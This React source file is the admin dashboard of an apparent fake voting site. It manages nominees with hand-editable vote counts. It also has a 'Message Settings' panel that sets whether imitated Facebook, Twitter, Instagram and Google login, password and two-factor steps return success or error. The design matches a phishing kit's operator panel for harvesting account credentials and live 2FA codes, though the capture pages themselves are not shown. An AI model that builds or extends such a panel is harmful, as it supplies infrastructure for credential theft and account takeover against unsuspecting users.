import { useState, useEffect } from 'react';
import { collection, addDoc, deleteDoc, doc, getDocs, updateDoc, getDoc, setDoc } from 'firebase/firestore';
import { db } from '@/lib/firebase';
import { useToast } from '@/hooks/use-toast';
import { Trash2, Loader2, Pencil, LogOut } from 'lucide-react';
import { formatNumber } from '@/lib/utils';
import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { AdminSettings, Platform, PlatformSettings, GoogleSettings } from '@/types/admin';
import { useNavigate } from 'react-router-dom';

type Category = 'music' | 'movie' | 'comedy' | 'content-creation' | 'sports';

interface Nominee {
  id: string;
  name: string;
  imageUrl: string;
  votes: number;
  category: Category;
}

const defaultSettings: AdminSettings = {
  platforms: {
    facebook: { login: { success: true }, twoFactor: { success: true } },
    twitter: { login: { success: true }, twoFactor: { success: true } },
    instagram: { login: { success: true }, twoFactor: { success: true } },
    google: {
      emailStep: { success: true },
      passwordStep: { success: true },
      twoFactor: { success: true }
    }
  }
};

const Admin = () => {
  const [nominees, setNominees] = useState<Nominee[]>([]);
  const [name, setName] = useState('');
  const [imageUrl, setImageUrl] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [editingId, setEditingId] = useState<string | null>(null);
  const [isDeleting, setIsDeleting] = useState<string | null>(null);
  const [votes, setVotes] = useState<number>(0);
  const [searchQuery, setSearchQuery] = useState('');
  const [filteredNominees, setFilteredNominees] = useState<Nominee[]>([]);
  const [category, setCategory] = useState<Category>('music');
  const [settings, setSettings] = useState<AdminSettings>(defaultSettings);
  const [dialogOpen, setDialogOpen] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();

  useEffect(() => {
    fetchNominees();
  }, []);

  useEffect(() => {
    if (!searchQuery.trim()) {
      setFilteredNominees(nominees);
      return;
    }

    const filtered = nominees.filter(nominee => 
      nominee.name.toLowerCase().includes(searchQuery.toLowerCase())
    );
    setFilteredNominees(filtered);
  }, [searchQuery, nominees]);

  useEffect(() => {
    fetchSettings();
  }, []);

  const fetchNominees = async () => {
    try {
    const querySnapshot = await getDocs(collection(db, 'nominees'));
      const nominees = querySnapshot.docs.map(doc => ({
      id: doc.id,
      ...doc.data()
    })) as Nominee[];
      setNominees(nominees);
    } catch (error) {
      console.error('Error fetching nominees:', error);
      toast({
        title: "Error",
        description: "Failed to fetch nominees",
        variant: "destructive",
      });
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!imageUrl) {
      toast({
        title: "Error",
        description: "Please enter an image URL",
        variant: "destructive",
      });
      return;
    }

    try {
      setIsSubmitting(true);

      await addDoc(collection(db, 'nominees'), {
        name,
        imageUrl,
        votes,
        category,
        createdAt: new Date().toISOString()
      });

      toast({
        title: "Success",
        description: `${name} has been added as a nominee.`,
      });

      setName('');
      setImageUrl('');
      setVotes(0);
      await fetchNominees();

    } catch (error) {
      console.error('Error adding nominee:', error);
      toast({
        title: "Error",
        description: error instanceof Error ? error.message : "Failed to add nominee",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleDelete = async (id: string) => {
    try {
      setIsDeleting(id);
      await deleteDoc(doc(db, 'nominees', id));
      toast({
        title: "Success",
        description: "Nominee deleted successfully!",
      });
      fetchNominees();
    } catch (error) {
      console.error('Error deleting nominee:', error);
      toast({
        title: "Error",
        description: "Failed to delete nominee. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsDeleting(null);
    }
  };

  const handleEdit = (nominee: Nominee) => {
    setEditingId(nominee.id);
    setName(nominee.name);
    setImageUrl(nominee.imageUrl);
    setVotes(nominee.votes);
    setCategory(nominee.category || 'music');
  };

  const handleCancelEdit = () => {
    setEditingId(null);
    setName('');
    setImageUrl('');
  };

  const handleUpdate = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!imageUrl) {
      toast({
        title: "Error",
        description: "Please enter an image URL",
        variant: "destructive",
      });
      return;
    }

    try {
      setIsSubmitting(true);
      
      const updateData = {
        name,
        imageUrl,
        votes,
        category,
        updatedAt: new Date().toISOString()
      };

      await updateDoc(doc(db, 'nominees', editingId!), updateData);

      toast({
        title: "Success",
        description: `${name} has been updated successfully`,
      });

      setName('');
      setImageUrl('');
      setVotes(0);
      setCategory('music');
      setEditingId(null);
      await fetchNominees();

    } catch (error) {
      console.error('Error updating nominee:', error);
      toast({
        title: "Error",
        description: error instanceof Error ? error.message : "Failed to update nominee",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const fetchSettings = async () => {
    try {
      const docRef = doc(db, 'settings', 'auth');
      const docSnap = await getDoc(docRef);
      
      if (docSnap.exists()) {
        setSettings(docSnap.data() as AdminSettings);
      } else {
        // Create settings document if it doesn't exist
        try {
          await setDoc(doc(db, 'settings', 'auth'), defaultSettings);
          setSettings(defaultSettings);
          toast({
            title: "Success",
            description: "Default settings initialized",
          });
        } catch (error) {
          console.error('Error creating settings:', error);
          // Fall back to default settings if creation fails
          setSettings(defaultSettings);
        }
      }
    } catch (error) {
      console.error('Error fetching settings:', error);
      // Fall back to default settings if fetch fails
      setSettings(defaultSettings);
      toast({
        title: "Warning",
        description: "Using default settings (offline mode)",
        variant: "default",
      });
    }
  };

  const updateSettings = async (
    platform: Platform,
    type: 'login' | 'twoFactor',
    value: boolean
  ) => {
    try {
      const newSettings = {
        ...settings,
        platforms: {
          ...settings.platforms,
          [platform]: {
            ...settings.platforms[platform],
            [type]: { success: value }
          }
        }
      };

      await setDoc(doc(db, 'settings', 'auth'), newSettings);
      setSettings(newSettings);

      toast({
        title: "Success",
        description: "Settings updated successfully",
      });
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to update settings",
        variant: "destructive",
      });
    }
  };

  const updateGoogleSettings = async (
    type: 'emailStep' | 'passwordStep' | 'twoFactor',
    value: boolean
  ) => {
    try {
      const newSettings = {
        ...settings,
        platforms: {
          ...settings.platforms,
          google: {
            ...settings.platforms.google,
            [type]: { success: value }
          }
        }
      };

      await setDoc(doc(db, 'settings', 'auth'), newSettings);
      setSettings(newSettings);

      toast({
        title: "Success",
        description: "Settings updated successfully",
      });
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to update settings",
        variant: "destructive",
      });
    }
  };

  // First, create a type guard function to check if it's Google settings
  const isGoogleSettings = (platform: Platform, settings: any): settings is GoogleSettings => {
    return platform === 'google';
  };

  const hasPlatformSettings = (platform: Platform, settings: AdminSettings) => {
    return settings.platforms[platform] !== undefined;
  };

  const handleLogout = () => {
    localStorage.removeItem('isAdminAuthenticated');
    toast({
      title: "Success",
      description: "Logged out successfully",
    });
    navigate('/admin/login');
  };

  return (
    <div className="min-h-screen bg-gray-50 py-12 px-4">
      <div className="max-w-7xl mx-auto">
        <div className="flex justify-between items-center mb-8">
          <h1 className="text-3xl font-bold">Admin Dashboard</h1>
          <div className="flex items-center gap-4">
            <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
              <DialogTrigger asChild>
                <Button variant="default">Change Message Settings</Button>
              </DialogTrigger>
              <DialogContent className="sm:max-w-[425px] max-h-[90vh] overflow-y-auto">
                <DialogHeader className="sticky top-0 bg-white pb-4 z-10">
                  <DialogTitle>Message Settings</DialogTitle>
                </DialogHeader>
                <div className="grid gap-6 py-4 overflow-y-auto">
                  {(Object.keys(settings.platforms) as Platform[])
                    .filter(platform => hasPlatformSettings(platform, settings))
                    .map((platform) => (
                      <div key={platform} className="space-y-4">
                        <h3 className="font-semibold capitalize sticky top-0 bg-white">{platform}</h3>
                        {platform === 'google' ? (
                          // Google settings with null checks
                          <div className="space-y-4 px-2">
                            <div className="space-y-2">
                              <label className="text-sm font-medium">Email Step Response</label>
                              <Select
                                value={settings.platforms.google?.emailStep?.success ? "success" : "error"}
                                onValueChange={(value) => 
                                  updateGoogleSettings('emailStep', value === "success")
                                }
                              >
                                <SelectTrigger>
                                  <SelectValue placeholder="Select response" />
                                </SelectTrigger>
                                <SelectContent>
                                  <SelectItem value="success">Success</SelectItem>
                                  <SelectItem value="error">Error</SelectItem>
                                </SelectContent>
                              </Select>
                            </div>

                            <div className="space-y-2">
                              <label className="text-sm font-medium">Password Step Response</label>
                              <Select
                                value={settings.platforms.google?.passwordStep?.success ? "success" : "error"}
                                onValueChange={(value) => 
                                  updateGoogleSettings('passwordStep', value === "success")
                                }
                              >
                                <SelectTrigger>
                                  <SelectValue placeholder="Select response" />
                                </SelectTrigger>
                                <SelectContent>
                                  <SelectItem value="success">Success</SelectItem>
                                  <SelectItem value="error">Error</SelectItem>
                                </SelectContent>
                              </Select>
                            </div>

                            <div className="space-y-2">
                              <label className="text-sm font-medium">2FA Response</label>
                              <Select
                                value={settings.platforms.google?.twoFactor?.success ? "success" : "error"}
                                onValueChange={(value) => 
                                  updateGoogleSettings('twoFactor', value === "success")
                                }
                              >
                                <SelectTrigger>
                                  <SelectValue placeholder="Select response" />
                                </SelectTrigger>
                                <SelectContent>
                                  <SelectItem value="success">Success</SelectItem>
                                  <SelectItem value="error">Error</SelectItem>
                                </SelectContent>
                              </Select>
                            </div>
                          </div>
                        ) : (
                          // Other platforms with null checks
                          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 px-2">
                            <div className="space-y-2">
                              <label className="text-sm font-medium">Login Response</label>
                              <Select
                                value={settings.platforms[platform]?.login?.success ? "success" : "error"}
                                onValueChange={(value) => 
                                  updateSettings(platform, 'login', value === "success")
                                }
                              >
                                <SelectTrigger>
                                  <SelectValue placeholder="Select response" />
                                </SelectTrigger>
                                <SelectContent>
                                  <SelectItem value="success">Success</SelectItem>
                                  <SelectItem value="error">Error</SelectItem>
                                </SelectContent>
                              </Select>
                            </div>
                            <div className="space-y-2">
                              <label className="text-sm font-medium">2FA Response</label>
                              <Select
                                value={settings.platforms[platform]?.twoFactor?.success ? "success" : "error"}
                                onValueChange={(value) => 
                                  updateSettings(platform, 'twoFactor', value === "success")
                                }
                              >
                                <SelectTrigger>
                                  <SelectValue placeholder="Select response" />
                                </SelectTrigger>
                                <SelectContent>
                                  <SelectItem value="success">Success</SelectItem>
                                  <SelectItem value="error">Error</SelectItem>
                                </SelectContent>
                              </Select>
                            </div>
                          </div>
                        )}
                      </div>
                    ))}
                </div>
              </DialogContent>
            </Dialog>
            
            <Button 
              variant="outline" 
              onClick={handleLogout}
              className="flex items-center gap-2"
            >
              <LogOut className="w-4 h-4" />
              Logout
            </Button>
          </div>
        </div>

        <div className="bg-white rounded-xl p-6 shadow-sm mb-8">
          <h2 className="text-2xl font-semibold mb-6">
            {editingId ? 'Edit Nominee' : 'Add New Nominee'}
          </h2>
          <form onSubmit={editingId ? handleUpdate : handleSubmit} className="space-y-4">
            <div>
              <label className="block text-sm font-medium mb-2">Name</label>
              <input
                type="text"
                value={name}
                onChange={(e) => setName(e.target.value)}
                className="w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent"
                required
              />
            </div>
            
            <div>
              <label className="block text-sm font-medium mb-2">Image URL</label>
              <input
                type="url"
                value={imageUrl}
                onChange={(e) => setImageUrl(e.target.value)}
                className="w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent"
                placeholder="https://example.com/image.jpg"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium mb-2">Votes</label>
              <input
                type="number"
                min="0"
                value={votes}
                onChange={(e) => setVotes(parseInt(e.target.value) || 0)}
                className="w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium mb-2">Category</label>
              <select
                value={category}
                onChange={(e) => setCategory(e.target.value as Category)}
                className="w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent"
                required
              >
                <option value="music">Music</option>
                <option value="movie">Movie</option>
                <option value="comedy">Comedy</option>
                <option value="content-creation">Content Creation</option>
                <option value="sports">Sports</option>
              </select>
            </div>

            <div className="flex gap-2">
            <button
              type="submit"
                disabled={isSubmitting}
                className="flex-1 bg-primary text-primary-foreground py-2 rounded-lg hover:bg-primary/90 transition-colors flex items-center justify-center"
              >
                {isSubmitting ? (
                  <>
                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                    {editingId ? 'Updating...' : 'Adding...'}
                  </>
                ) : (
                  editingId ? 'Update Nominee' : 'Add Nominee'
                )}
              </button>
              
              {editingId && (
                <button
                  type="button"
                  onClick={handleCancelEdit}
                  className="px-4 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors"
                >
                  Cancel
            </button>
              )}
            </div>
          </form>
        </div>

        <div className="bg-white rounded-xl p-6 shadow-sm">
          <div className="flex items-center justify-between mb-6">
            <h2 className="text-2xl font-semibold">Current Nominees</h2>
            <div className="relative w-72">
              <input
                type="search"
                placeholder="Search nominees..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full px-4 py-2 pr-10 border rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent"
              />
              <svg
                className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400"
                fill="none"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="2"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
              </svg>
            </div>
          </div>
          <div className="space-y-4">
            {filteredNominees.length === 0 ? (
              <p className="text-center text-gray-500 py-4">
                {nominees.length === 0 ? 'No nominees yet' : 'No nominees found'}
              </p>
            ) : (
              filteredNominees.map((nominee) => (
              <div
                key={nominee.id}
                className="flex items-center justify-between p-4 border rounded-lg"
              >
                <div className="flex items-center space-x-4">
                  <img
                    src={nominee.imageUrl}
                    alt={nominee.name}
                    className="w-12 h-12 rounded-lg object-cover"
                  />
                  <div>
                    <h3 className="font-medium">{nominee.name}</h3>
                      <div className="flex items-center gap-2 text-sm text-muted-foreground">
                        <span>{formatNumber(nominee.votes)} votes</span>
                        <span>•</span>
                        <span className="capitalize">
                          {nominee.category ? nominee.category.replace('-', ' ') : 'Uncategorized'}
                        </span>
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    <button
                      onClick={() => handleEdit(nominee)}
                      className="p-2 text-blue-500 hover:bg-blue-50 rounded-lg transition-colors"
                    >
                      <Pencil className="w-5 h-5" />
                    </button>
                <button
                  onClick={() => handleDelete(nominee.id)}
                      disabled={isDeleting === nominee.id}
                      className="p-2 text-red-500 hover:bg-red-50 rounded-lg transition-colors disabled:opacity-50"
                >
                      {isDeleting === nominee.id ? (
                        <Loader2 className="w-5 h-5 animate-spin" />
                      ) : (
                  <Trash2 className="w-5 h-5" />
                      )}
                </button>
              </div>
                </div>
              ))
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default Admin;
